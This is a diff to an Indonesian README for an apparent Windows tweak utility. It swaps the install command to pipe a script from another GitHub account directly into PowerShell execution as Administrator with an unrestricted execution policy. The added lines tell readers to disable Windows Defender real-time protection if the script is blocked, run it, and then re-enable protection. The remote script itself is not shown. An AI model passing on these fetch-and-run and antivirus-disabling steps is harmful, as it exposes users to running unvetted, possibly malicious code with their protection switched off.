@@ -17,4 +17,14 @@
 ```powershell
 # Buka PowerShell sebagai Administrator
 Set-ExecutionPolicy Unrestricted -Force
-irm https://raw.githubusercontent.com/username-anda/WinUtil-Omega/main/winutil_omega.ps1 | iex
+irm https://raw.githubusercontent.com/Hanzala903/tweakme/main/winutil_ultimate.ps1 | iex
+
+Jika ada kesalahan kayak di tolak pakai powershell dibawah ini untuk mematikan antivirus sementara
+ # Matikan Real-time Protection sementara
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Lalu jalankan script
+irm https://raw.githubusercontent.com/Hanzala903/tweakme/main/winutil_ultimate.ps1 | iex
+
+# Setelah selesai, hidupkan lagi
+Set-MpPreference -DisableRealtimeMonitoring $false
